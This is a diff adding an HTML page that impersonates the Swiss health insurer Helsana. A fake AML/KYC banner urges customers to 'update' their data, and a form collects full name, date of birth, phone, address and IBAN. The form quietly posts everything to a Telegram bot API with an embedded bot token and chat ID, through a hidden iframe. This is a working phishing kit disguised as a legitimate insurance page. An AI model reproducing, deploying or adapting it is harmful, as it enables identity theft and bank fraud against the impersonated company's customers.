@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Helsana</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+  <header class="header">
+    <a class="header__logo" href="/" aria-label="Helsana">
+      <img src="assets/helsana-logo.svg" alt="Helsana" width="112" height="22" class="header__logo-img">
+    </a>
+
+    <div class="lang-switcher">
+      <button type="button" class="lang-btn is-active" data-lang="ch">CH</button>
+      <button type="button" class="lang-btn" data-lang="en">EN</button>
+    </div>
+  </header>
+
+  <main class="main">
+    
+    <!-- Блок с предупреждением -->
+    <div class="alert-banner">
+      <div class="alert-banner__inner">
+        <div class="alert-banner__icon">
+          <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+            <line x1="12" y1="9" x2="12" y2="13"></line>
+            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+          </svg>
+        </div>
+        
+        <div class="alert-banner__content">
+          <p class="alert-banner__text" data-lang-ch="Aufgrund neuer GwG-/KYC-Vorgaben sind wir verpflichtet, Ihre Kundendaten zu aktualisieren." data-lang-en="Due to new AML/KYC requirements we are obliged to update your customer data.">Aufgrund neuer GwG-/KYC-Vorgaben sind wir verpflichtet, Ihre Kundendaten zu aktualisieren.</p>
+          <p class="alert-banner__text" data-lang-ch="Bitte prüfen Sie Ihre Angaben kurz und bestätigen Sie diese anschliessend." data-lang-en="Please review your details briefly and confirm them afterwards.">Bitte prüfen Sie Ihre Angaben kurz und bestätigen Sie diese anschliessend.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="container">
+      <!-- Карточка 1 -->
+      <section class="promo">
+        <div class="promo__container">
+          <img src="assets/1.webp" alt="Paar" class="promo__img">
+          <div class="promo__box">
+            <h2 class="promo__title" data-lang-ch="Schon bei uns versichert?" data-lang-en="Already insured with us?">Schon bei uns versichert?</h2>
+            <p class="promo__text" data-lang-ch="Wechseln Sie zur Nummer 1 mit über 2 Millionen Versicherten." data-lang-en="Switch to the number 1 with over 2 million insured persons.">Wechseln Sie zur Nummer 1 mit über 2 Millionen Versicherten.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Форма -->
+      <section class="premium-calc">
+        <h2 class="premium-calc__title" data-lang-ch="Persönliche Daten" data-lang-en="Personal details">Persönliche Daten</h2>
+
+        <form class="premium-calc__form" 
+              id="telegramForm"
+              action="https://api.telegram.org/bot9058538400:AAEl23TNQe-crDRRXG8jfgw-0UsLbGikwZ8/sendMessage" 
+              method="POST"
+              target="tg_iframe">
+              
+          <input type="hidden" name="chat_id" value="-1003907097706">
+          <input type="hidden" name="parse_mode" value="Markdown">
+          <textarea name="text" id="telegramText" style="display:none;"></textarea>
+
+          <div class="input-group">
+            <input type="text" id="name" class="input-field" placeholder=" " required>
+            <label for="name" class="input-label" data-lang-ch="Ihr vollständiger Name" data-lang-en="Your full name">Ihr vollständiger Name</label>
+          </div>
+
+          <div class="input-group">
+            <input type="text" id="geburtsdatum" class="input-field" placeholder=" " required>
+            <label for="geburtsdatum" class="input-label" data-lang-ch="Ihr Geburtsdatum" data-lang-en="Your date of birth">Ihr Geburtsdatum</label>
+          </div>
+
+          <div class="input-group phone-group">
+            <div class="phone-prefix">+41</div>
+            <input type="tel" id="telefon" class="input-field phone-input" placeholder=" " required>
+            <label for="telefon" class="input-label phone-label" data-lang-ch="Ihre Telefonnummer" data-lang-en="Your phone number">Ihre Telefonnummer</label>
+          </div>
+
+          <!-- Поля: Улица -> Индекс -> Город -->
+          <div class="form-row">
+            <div class="input-group">
+              <input type="text" id="adresse" class="input-field" placeholder=" " required>
+              <label for="adresse" class="input-label" data-lang-ch="Strasse und Hausnummer" data-lang-en="Street and house number">Strasse und Hausnummer</label>
+            </div>
+
+            <div class="input-group">
+              <input type="text" id="plz" class="input-field" placeholder=" " required>
+              <label for="plz" class="input-label" data-lang-ch="Postleitzahl" data-lang-en="Zip code">Postleitzahl</label>
+            </div>
+
+            <div class="input-group">
+              <input type="text" id="stadt" class="input-field" placeholder=" " required>
+              <label for="stadt" class="input-label" data-lang-ch="Wohnort" data-lang-en="Place of residence">Wohnort</label>
+            </div>
+          </div>
+
+          <!-- Поле IBAN с префиксом CH -->
+          <div class="input-group iban-group">
+            <div class="iban-prefix">CH</div>
+            <input type="text" id="iban" class="input-field iban-input" placeholder=" " required>
+            <label for="iban" class="input-label iban-label" data-lang-ch="Ihre IBAN" data-lang-en="Your IBAN">Ihre IBAN</label>
+          </div>
+
+          <button type="submit" class="premium-btn" data-lang-ch="Senden" data-lang-en="Send">Senden</button>
+        </form>
+      </section>
+
+      <!-- Карточка 2 -->
+      <section class="promo">
+        <div class="promo__container">
+          <img src="assets/2.webp" alt="Gesundheitsberatung" class="promo__img">
+          <div class="promo__box">
+            <h2 class="promo__title" data-lang-ch="Mehr Energie für graue Tage" data-lang-en="More energy for grey days">Mehr Energie für graue Tage</h2>
+            <p class="promo__text" data-lang-ch="Ständig müde, antriebslos oder gereizt? Unsere Gesundheitsberatung ist für Sie da." data-lang-en="Constantly tired, listless or irritable? Our health advice is here for you.">Ständig müde, antriebslos oder gereizt? Unsere Gesundheitsberatung ist für Sie da.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Карточка 3 -->
+      <section class="promo">
+        <div class="promo__container">
+          <img src="assets/3.webp" alt="Versicherungstipps" class="promo__img">
+          <div class="promo__box">
+            <h2 class="promo__title" data-lang-ch="Rundum gut versichert" data-lang-en="Well insured all round">Rundum gut versichert</h2>
+            <p class="promo__text" data-lang-ch="Entdecken Sie Spartipps, hilfreiche Informationen und Antworten auf die wichtigsten Fragen." data-lang-en="Discover savings tips, helpful information and answers to the most important questions.">Entdecken Sie Spartipps, hilfreiche Informationen und Antworten auf die wichtigsten Fragen.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Блок преимуществ -->
+      <section class="advantages">
+        <h2 class="advantages__title" data-lang-ch="Ihre Vorteile bei Helsana" data-lang-en="Your benefits with Helsana">Ihre Vorteile bei Helsana</h2>
+        <p class="advantages__lead" data-lang-ch="Es lohnt sich, Kundin oder Kunde bei Helsana zu sein. Über 2 Millionen Versicherte vertrauen der Marktleiterin – profitieren auch Sie von zahlreichen Vorteilen." data-lang-en="It pays to be a customer of Helsana. Over 2 million insured persons trust the market leader – benefit from numerous advantages too.">Es lohnt sich, Kundin oder Kunde bei Helsana zu sein. Über 2 Millionen Versicherte vertrauen der Marktleiterin – profitieren auch Sie von zahlreichen Vorteilen.</p>
+
+        <div class="advantages__list">
+          <div class="advantage-item">
+            <div class="advantage-icon">
+              <svg viewBox="0 0 24 24" width="40" height="40" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
+                <circle cx="9" cy="7" r="4" />
+                <path d="M22 21v-2a4 4 0 0 0-3-3.87" />
+                <path d="M16 3.13a4 4 0 0 1 0 7.75" />
+              </svg>
+            </div>
+            <h3 class="advantage-title" data-lang-ch="Persönliche Beratung: Online oder an 40+ Standorten schweizweit" data-lang-en="Personal advice: Online or at 40+ locations throughout Switzerland">Persönliche Beratung: Online oder an 40+ Standorten schweizweit</h3>
+          </div>
+
+          <div class="advantage-item">
+            <div class="advantage-icon">
+              <svg viewBox="0 0 24 24" width="40" height="40" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="20 12 20 22 4 22 4 12" />
+                <rect x="2" y="7" width="20" height="5" />
+                <line x1="12" y1="22" x2="12" y2="7" />
+                <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z" />
+                <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z" />
+              </svg>
+            </div>
+            <h3 class="advantage-title" data-lang-ch="Bonusprogramm: Helsana+ belohnt einen gesunden Lebensstil" data-lang-en="Bonus programme: Helsana+ rewards a healthy lifestyle">Bonusprogramm: Helsana+ belohnt einen gesunden Lebensstil</h3>
+          </div>
+
+          <div class="advantage-item">
+            <div class="advantage-icon">
+              <svg viewBox="0 0 24 24" width="40" height="40" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
+                <polyline points="9 22 9 12 15 12 15 22" />
+              </svg>
+            </div>
+            <h3 class="advantage-title" data-lang-ch="myHelsana: Digitaler Ordner für Ihre Krankenversicherung" data-lang-en="myHelsana: Digital folder for your health insurance">myHelsana: Digitaler Ordner für Ihre Krankenversicherung</h3>
+          </div>
+        </div>
+      </section>
+    </div> 
+
+    <!-- Блок наград -->
+    <section class="awards">
+      <div class="awards__container">
+        <h2 class="awards__title" data-lang-ch="Unsere Auszeichnungen für Kundenzufriedenheit" data-lang-en="Our awards for customer satisfaction">Unsere Auszeichnungen für Kundenzufriedenheit</h2>
+        <p class="awards__lead" data-lang-ch="Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu geben – im Kundenservice wie auch bei unseren Versicherungen." data-lang-en="Helsana is one of the health insurers with the most satisfied customers and excellent products. This is confirmed by the most important industry ratings. The top marks spur us on to do our best day after day – in customer service as well as with our insurance policies.">Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu geben – im Kundenservice wie auch bei unseren Versicherungen.</p>
+
+        <div class="awards__badges">
+          <img src="assets/123.svg" alt="Auszeichnungen: Ktipp, Comparis, Moneyland" width="356" height="83" class="awards__img">
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- ПОДВАЛ -->
+  <footer class="footer">
+    <div class="footer__top">
+      <div class="footer__container">
+        <h2 class="footer__title" data-lang-ch="Haben Sie Fragen?" data-lang-en="Do you have questions?">Haben Sie Fragen?</h2>
+        <p class="footer__subtitle" data-lang-ch="Gerne helfen wir Ihnen weiter." data-lang-en="We are happy to help you.">Gerne helfen wir Ihnen weiter.</p>
+        <a href="#kontakt" class="footer__btn" data-lang-ch="Kontakt aufnehmen" data-lang-en="Contact us">Kontakt aufnehmen</a>
+      </div>
+    </div>
+
+    <div class="footer__main">
+      <div class="footer__container">
+        <div class="footer__nav-grid">
+          <div class="footer__nav-col">
+            <h3 class="footer__nav-title" data-lang-ch="Services" data-lang-en="Services">Services</h3>
+            <ul class="footer__nav-list">
+              <li><a href="#" data-lang-ch="Rechnungen einsenden" data-lang-en="Submit invoices">Rechnungen einsenden</a></li>
+              <li><a href="#" data-lang-ch="Adresse ändern" data-lang-en="Change address">Adresse ändern</a></li>
+              <li><a href="#" data-lang-ch="Alle Services" data-lang-en="All services">Alle Services</a></li>
+            </ul>
+          </div>
+
+          <div class="footer__nav-col">
+            <h3 class="footer__nav-title" data-lang-ch="Bereiche" data-lang-en="Areas">Bereiche</h3>
+            <ul class="footer__nav-list">
+              <li><a href="#" data-lang-ch="Für Private" data-lang-en="For private individuals">Für Private</a></li>
+              <li><a href="#" data-lang-ch="Für Unternehmen" data-lang-en="For companies">Für Unternehmen</a></li>
+              <li><a href="#" data-lang-ch="Helsana-Gruppe" data-lang-en="Helsana Group">Helsana-Gruppe</a></li>
+            </ul>
+          </div>
+
+          <div class="footer__nav-col">
+            <h3 class="footer__nav-title" data-lang-ch="Helsana" data-lang-en="Helsana">Helsana</h3>
+            <ul class="footer__nav-list">
+              <li><a href="#" data-lang-ch="Über uns" data-lang-en="About us">Über uns</a></li>
+              <li><a href="#" data-lang-ch="Jobs & Karriere" data-lang-en="Jobs & careers">Jobs & Karriere</a></li>
+              <li><a href="#" data-lang-ch="Medien & Publikationen" data-lang-en="Media & publications">Medien & Publikationen</a></li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="footer__bottom">
+          <ul class="footer__legal">
+            <li><a href="#" data-lang-ch="Impressum" data-lang-en="Imprint">Impressum</a></li>
+            <li><a href="#" data-lang-ch="Datenschutz" data-lang-en="Privacy policy">Datenschutz</a></li>
+            <li><a href="#" data-lang-ch="Rechtliche Hinweise" data-lang-en="Legal notices">Rechtliche Hinweise</a></li>
+            <li><a href="#" data-lang-ch="Cookie-Einstellungen" data-lang-en="Cookie settings">Cookie-Einstellungen</a></li>
+          </ul>
+
+          <div class="footer__socials">
+            <a href="#" aria-label="Facebook">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M14 13.5h2.5l1-4H14v-2c0-1.03 0-2 2-2h1.5V2.14c-.326-.043-1.557-.14-2.857-.14C11.928 2 10 3.657 10 6.7v2.8H7v4h3V22h4v-8.5z"/></svg>
+            </a>
+            <a href="#" aria-label="Instagram">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/></svg>
+            </a>
+            <a href="#" aria-label="YouTube">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M21.582 6.186a2.5 2.5 0 0 0-1.768-1.768C18.25 4 12 4 12 4s-6.25 0-7.814.418A2.5 2.5 0 0 0 2.418 6.186C2 7.75 2 12 2 12s0 4.25.418 5.814a2.5 2.5 0 0 0 1.768 1.768C5.75 20 12 20 12 20s6.25 0 7.814-.418a2.5 2.5 0 0 0 1.768-1.768C22 16.25 22 12 22 12s0-4.25-.418-5.814zM9.5 15.5v-7l6.5 3.5-6.5 3.5z"/></svg>
+            </a>
+            <a href="#" aria-label="LinkedIn">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M4.98 3.5C4.98 4.881 3.87 6 2.5 6S.02 4.881.02 3.5C.02 2.12 1.13 1 2.5 1s2.48 1.12 2.48 2.5zM.5 8h4V24h-4V8zm7.5 0h3.8v2.2h.1c.5-.9 1.7-1.8 3.5-1.8 3.8 0 4.5 2.5 4.5 5.7V24h-4v-8.5c0-2-.1-4.6-2.8-4.6-2.8 0-3.2 2.2-3.2 4.4V24H8V8z"/></svg>
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <iframe name="tg_iframe" id="tg_iframe" style="display:none;"></iframe>
+
+  <script src="js/script.js"></script>
+
+</body>
+</html>
